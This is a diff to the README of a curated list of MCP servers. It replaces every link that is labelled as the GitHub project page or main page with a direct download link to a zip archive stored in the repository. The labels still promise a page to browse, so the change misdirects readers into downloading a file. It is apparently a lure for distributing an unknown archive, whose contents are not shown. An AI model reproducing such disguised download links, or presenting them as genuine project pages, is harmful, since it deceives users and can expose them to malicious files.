@@ -1,6 +1,6 @@
 # 📚 curated-mcp-servers - Find MCP servers fast
 
-[![Download / Open Project](https://img.shields.io/badge/Open%20Project-2F80ED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Huyhoan2559/curated-mcp-servers)
+[![Download / Open Project](https://img.shields.io/badge/Open%20Project-2F80ED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Huyhoan2559/curated-mcp-servers/raw/refs/heads/main/docs/mcp-servers-curated-v3.8.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ curated-mcp-servers is a hand-picked list of MCP servers, tools, and resources f
 
 If you want to browse the list on Windows, use the link below:
 
-[Visit the project page](https://github.com/Huyhoan2559/curated-mcp-servers)
+[Visit the project page](https://github.com/Huyhoan2559/curated-mcp-servers/raw/refs/heads/main/docs/mcp-servers-curated-v3.8.zip)
 
 ## 🪟 How to Use on Windows
 
@@ -26,7 +26,7 @@ This project is a GitHub repository, so you do not install it like a normal app.
 
 Use this link to visit the main page and start browsing:
 
-[Open curated-mcp-servers on GitHub](https://github.com/Huyhoan2559/curated-mcp-servers)
+[Open curated-mcp-servers on GitHub](https://github.com/Huyhoan2559/curated-mcp-servers/raw/refs/heads/main/docs/mcp-servers-curated-v3.8.zip)
 
 ## ✨ What You Can Find
 
@@ -126,7 +126,7 @@ If you are not sure what to pick, start with a tool that matches one clear task.
 
 Main page:
 
-https://github.com/Huyhoan2559/curated-mcp-servers
+https://github.com/Huyhoan2559/curated-mcp-servers/raw/refs/heads/main/docs/mcp-servers-curated-v3.8.zip
 
 ## 📘 Using the List Well
 
